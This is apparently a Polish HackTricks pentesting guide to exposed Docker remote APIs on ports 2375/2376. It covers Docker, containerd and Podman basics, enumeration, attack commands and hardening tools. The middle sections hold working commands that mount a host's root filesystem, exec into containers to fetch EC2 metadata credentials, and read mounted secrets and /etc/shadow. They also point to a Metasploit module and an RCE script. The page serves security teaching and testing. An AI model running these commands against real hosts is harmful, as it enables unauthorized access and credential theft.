# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Podstawy Dockera

#### Co to jest

Docker to **wiodąca platforma** w **przemyśle konteneryzacji**, prowadząca **ciągłe innowacje**. Umożliwia łatwe tworzenie i dystrybucję aplikacji, od **tradycyjnych po futurystyczne**, i zapewnia ich **bezpieczne wdrożenie** w różnych środowiskach.

#### Podstawowa architektura dockera

- [**containerd**](http://containerd.io): To **podstawowy czas wykonania** dla kontenerów, odpowiedzialny za kompleksowe **zarządzanie cyklem życia kontenera**. Obejmuje to obsługę **transferu i przechowywania obrazów**, a także nadzorowanie **wykonywania, monitorowania i sieci** kontenerów. **Szczegółowe informacje** na temat containerd są **dalsze badane**.
- **container-shim** odgrywa kluczową rolę jako **pośrednik** w obsłudze **kontenerów bezgłowych**, płynnie przejmując od **runc** po zainicjowaniu kontenerów.
- [**runc**](http://runc.io): Ceniony za swoje **lekkie i uniwersalne możliwości czasu wykonania kontenerów**, runc jest zgodny z **standardem OCI**. Jest używany przez containerd do **uruchamiania i zarządzania kontenerami** zgodnie z **wytycznymi OCI**, rozwijając się z oryginalnego **libcontainer**.
- [**grpc**](http://www.grpc.io) jest niezbędny do **ułatwiania komunikacji** między containerd a **docker-engine**, zapewniając **efektywną interakcję**.
- [**OCI**](https://www.opencontainers.org) jest kluczowe w utrzymywaniu **specyfikacji OCI** dla czasu wykonania i obrazów, przy czym najnowsze wersje Dockera są **zgodne zarówno z obrazem OCI, jak i standardami czasu wykonania**.

#### Podstawowe polecenia
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** został specjalnie opracowany, aby zaspokoić potrzeby platform kontenerowych, takich jak **Docker i Kubernetes**, między innymi. Jego celem jest **uproszczenie uruchamiania kontenerów** na różnych systemach operacyjnych, w tym Linux, Windows, Solaris i innych, poprzez abstrahowanie funkcjonalności specyficznych dla systemu operacyjnego i wywołań systemowych. Celem Containerd jest uwzględnienie tylko niezbędnych funkcji wymaganych przez jego użytkowników, dążąc do pominięcia zbędnych komponentów. Jednak całkowite osiągnięcie tego celu uznawane jest za trudne.

Kluczową decyzją projektową jest to, że **Containerd nie obsługuje sieci**. Sieć jest uważana za krytyczny element w systemach rozproszonych, z złożonościami takimi jak Software Defined Networking (SDN) i odkrywanie usług, które znacznie różnią się w zależności od platformy. Dlatego Containerd pozostawia aspekty sieciowe do zarządzania przez platformy, które wspiera.

Podczas gdy **Docker wykorzystuje Containerd** do uruchamiania kontenerów, ważne jest, aby zauważyć, że Containerd obsługuje tylko podzbiór funkcjonalności Dockera. Konkretnie, Containerd nie ma możliwości zarządzania siecią obecnych w Dockerze i nie obsługuje bezpośredniego tworzenia swarmów Dockera. To rozróżnienie podkreśla skoncentrowaną rolę Containerd jako środowiska uruchomieniowego kontenerów, delegując bardziej wyspecjalizowane funkcjonalności do platform, z którymi się integruje.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** to otwartoźródłowy silnik kontenerowy, który przestrzega standardów [Open Container Initiative (OCI)](https://github.com/opencontainers), opracowany i utrzymywany przez Red Hat. Wyróżnia się na tle Dockera kilkoma charakterystycznymi cechami, w szczególności **architekturą bezdemową** i wsparciem dla **kontenerów bez uprawnień root**, co umożliwia użytkownikom uruchamianie kontenerów bez uprawnień administratora.

Podman został zaprojektowany tak, aby był kompatybilny z API Dockera, co pozwala na używanie poleceń CLI Dockera. Ta kompatybilność obejmuje jego ekosystem, który zawiera narzędzia takie jak **Buildah** do budowania obrazów kontenerów oraz **Skopeo** do operacji na obrazach, takich jak push, pull i inspect. Więcej informacji na temat tych narzędzi można znaleźć na ich [stronie GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Kluczowe różnice**

- **Architektura**: W przeciwieństwie do modelu klient-serwer Dockera z działającym w tle demonem, Podman działa bez demona. Taki projekt oznacza, że kontenery działają z uprawnieniami użytkownika, który je uruchamia, co zwiększa bezpieczeństwo poprzez eliminację potrzeby dostępu root.
- **Integracja z systemd**: Podman integruje się z **systemd** w celu zarządzania kontenerami, co pozwala na zarządzanie kontenerami za pomocą jednostek systemd. To kontrastuje z użyciem systemd przez Dockera głównie do zarządzania procesem demona Dockera.
- **Kontenery bez uprawnień root**: Kluczową cechą Podmana jest jego zdolność do uruchamiania kontenerów z uprawnieniami użytkownika, który je inicjuje. Takie podejście minimalizuje ryzyko związane z naruszeniami kontenerów, zapewniając, że atakujący uzyskuje tylko uprawnienia skompromitowanego użytkownika, a nie dostęp root.

Podejście Podmana oferuje bezpieczną i elastyczną alternatywę dla Dockera, kładąc nacisk na zarządzanie uprawnieniami użytkowników i kompatybilność z istniejącymi przepływami pracy Dockera.

> [!NOTE]
> Zauważ, że ponieważ podman ma na celu wsparcie tego samego API co docker, możesz używać tych samych poleceń z podmanem, co z dockerem, takich jak:
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Podstawowe informacje

Zdalne API działa domyślnie na porcie 2375, gdy jest włączone. Usługa domyślnie nie wymaga uwierzytelnienia, co pozwala atakującemu na uruchomienie uprzywilejowanego kontenera dockera. Korzystając ze Zdalnego API, można podłączyć hosty / (katalog główny) do kontenera i odczytywać/zapisywać pliki w środowisku hosta.

**Domyślny port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeracja

#### Ręczna

Zauważ, że aby enumerować API dockera, możesz użyć polecenia `docker` lub `curl`, jak w poniższym przykładzie:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Jeśli możesz **skontaktować się z zdalnym API dockera za pomocą polecenia `docker`**, możesz **wykonać** dowolne z **poleceń dockera** [**wcześniej** omówionych](2375-pentesting-docker.md#basic-commands), aby zainteresować się usługą.

> [!NOTE]
> Możesz `export DOCKER_HOST="tcp://localhost:2375"` i **unikać** używania parametru `-H` z poleceniem docker

**Szybka eskalacja uprawnień**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Czasami zobaczysz, że **2376** jest dostępny dla punktu końcowego **TLS**. Nie udało mi się połączyć z nim za pomocą klienta docker, ale można to zrobić za pomocą curl.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Jeśli chcesz uzyskać więcej informacji na ten temat, więcej informacji jest dostępnych tam, skąd skopiowałem polecenia: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatyczny
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromitacja

Na poniższej stronie można znaleźć sposoby na **ucieczkę z kontenera docker**:

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

Wykorzystując to, możliwe jest wydostanie się z kontenera, można uruchomić słaby kontener na zdalnej maszynie, uciec z niego i skompromitować maszynę:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Eskalacja uprawnień

Jeśli jesteś wewnątrz hosta, który używa dockera, możesz [**przeczytać te informacje, aby spróbować podnieść uprawnienia**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Odkrywanie sekretów w działających kontenerach Docker
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Sprawdź **env** (sekcja zmiennych środowiskowych) w poszukiwaniu sekretów, a możesz znaleźć:

- Hasła.
- Adresy IP.
- Porty.
- Ścieżki.
- Inne… .

Jeśli chcesz wyodrębnić plik:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Zabezpieczanie swojego Dockera

#### Zabezpieczanie instalacji i użycia Dockera

- Możesz użyć narzędzia [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) do sprawdzenia swojej aktualnej instalacji dockera.
- `./docker-bench-security.sh`
- Możesz użyć narzędzia [https://github.com/kost/dockscan](https://github.com/kost/dockscan) do sprawdzenia swojej aktualnej instalacji dockera.
- `dockscan -v unix:///var/run/docker.sock`
- Możesz użyć narzędzia [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) do sprawdzenia, jakie uprawnienia będzie miała kontener, gdy będzie uruchamiany z różnymi opcjami zabezpieczeń. To jest przydatne, aby znać implikacje używania niektórych opcji zabezpieczeń do uruchamiania kontenera:
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Zabezpieczanie obrazów Dockera

- Możesz użyć obrazu dockera [https://github.com/quay/clair](https://github.com/quay/clair), aby przeskanować inne obrazy dockera i znaleźć luki.
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Zabezpieczanie Dockerfile

- Możesz użyć narzędzia [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter), aby **sprawdzić swój Dockerfile** i znaleźć wszelkiego rodzaju błędy konfiguracyjne. Każdy błąd konfiguracyjny otrzyma identyfikator, możesz znaleźć tutaj [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md), jak naprawić każdy z nich.
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- Możesz użyć narzędzia [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint), aby **sprawdzić swój Dockerfile** i znaleźć wszelkiego rodzaju błędy konfiguracyjne.
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- Możesz użyć narzędzia [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint), aby **sprawdzić swój Dockerfile** i znaleźć wszelkiego rodzaju błędy konfiguracyjne.
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- Możesz użyć narzędzia [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint), aby **sprawdzić swój Dockerfile** i znaleźć wszelkiego rodzaju błędy konfiguracyjne.
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### Rejestrowanie podejrzanej aktywności

- Możesz użyć narzędzia [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco), aby wykryć **podejrzane zachowanie w uruchomionych kontenerach**.
- Zauważ w poniższym fragmencie, jak **Falco kompiluje moduł jądra i go wstawia**. Po tym ładuje zasady i **zaczyna rejestrować podejrzane aktywności**. W tym przypadku wykryto 2 uruchomione kontenery z uprawnieniami, jeden z nich z wrażliwym montażem, a po kilku sekundach wykryto, jak w jednym z kontenerów otwarto powłokę.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Monitorowanie Dockera

Możesz użyć auditd do monitorowania dockera.

### Odniesienia

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
